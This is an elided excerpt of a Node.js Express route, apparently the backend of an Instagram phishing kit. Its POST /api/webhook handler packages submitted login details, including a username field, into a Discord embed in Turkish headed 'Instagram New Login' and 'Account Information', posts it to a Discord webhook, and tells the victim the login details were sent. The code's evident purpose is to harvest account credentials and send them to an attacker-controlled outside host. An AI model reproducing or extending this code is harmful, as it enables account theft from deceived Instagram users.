...
async function registerRoutes(app2) {
  app2.post("/api/webhook", async (req, res) => {
    try {
      ...
      const message = {
        content: "\u{1F6A8} **Instagram Yeni Giri\u015F** \u{1F6A8}",
        embeds: [{
          title: "Hesap Bilgileri;",
          color: 16426522,
          // Instagram pembemsi renk
          fields: [
            {
              name: "\u{1F464} Kullan\u0131c\u0131 Ad\u0131:",
              value: username,
              inline: true
            },
            {
      ...
      try {
        ...
        return res.status(200).json({ success: true, message: "Giri\u015F bilgileri ba\u015Far\u0131yla g\xF6nderildi!" });
      } catch (error) {
        console.error("Discord webhook error:", error);
        return res.status(500).json({
          success: false,
          message: "Bilgiler g\xF6nderilirken bir hata olu\u015Ftu. L\xFCtfen daha sonra tekrar deneyin."
        });
      }
    } catch (error) {
